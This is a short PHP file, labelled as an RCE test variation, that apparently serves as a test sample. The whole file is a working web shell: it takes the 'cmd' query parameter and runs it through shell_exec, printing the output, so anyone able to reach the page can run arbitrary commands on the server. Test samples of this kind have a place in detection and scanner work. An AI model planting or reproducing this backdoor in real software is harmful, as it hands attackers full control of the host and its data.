<?php
// RCE test variation #859
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>